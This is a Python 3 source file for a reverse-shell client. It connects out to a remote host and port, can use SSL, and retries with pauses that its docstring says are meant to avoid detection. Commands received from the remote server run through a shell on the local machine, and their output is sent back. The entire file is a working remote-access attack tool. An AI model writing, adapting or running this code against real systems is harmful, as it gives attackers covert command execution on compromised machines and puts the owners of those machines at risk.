"""
Author       - pyCity
Date         - 1/22/2019
Version      - 1.5

Usage:       - python client.py --ssl 127.0.0.1 4444

Description: - Reverse shell in python 3. Has SSL functionality and periods of sleep to avoid detection.
             - Ncat --ssl is a valid alternative to using the server.py provided
"""

import socket
import subprocess
import os
import time
import argparse
import ssl
import sys


def parse_args():
    """Define host and port variables with optional ssl"""

    parser = argparse.ArgumentParser(description="Python remote tcp client")
    parser.add_argument("host", help="Remote host name to connect to")
    parser.add_argument("port", help="Remote port to connect to", type=int)
    parser.add_argument("--ssl", help="Enable ssl encryption", action="store_true")

    # Array of parsed arguments (host, port, encryption)
    args = parser.parse_args()
    host, port, enc = args.host, args.port, args.ssl
    return host, port, enc



def connect(host, port, enc=False):
    """Create socket object, connect socket to server"""

    # Wait 10 secs if connection isn't successful immediately
    for i in range(10):
        try:
            s = socket.socket()
            if enc == True:
                s = ssl.wrap_socket(s)
            s.connect((host, port))
            return s
        except:
            time.sleep(10)



def serve_shell(s):
    """Recieve commands from remote server and run on local machine"""

    # Standard reverse shell
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8").strip())
        elif data[:4].decode("utf-8").strip() == 'kill':
            break
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)

            bytes_recieved = cmd.stdout.read() + cmd.stderr.read()
            output = str(bytes_recieved, "utf-8")
            s.send(str.encode(output + str(os.getcwd()) + '#> '))
    s.close()
    sys.exit()



if __name__ == "__main__":
    host, port, enc = parse_args()
    serve_shell(connect(host, port, enc))
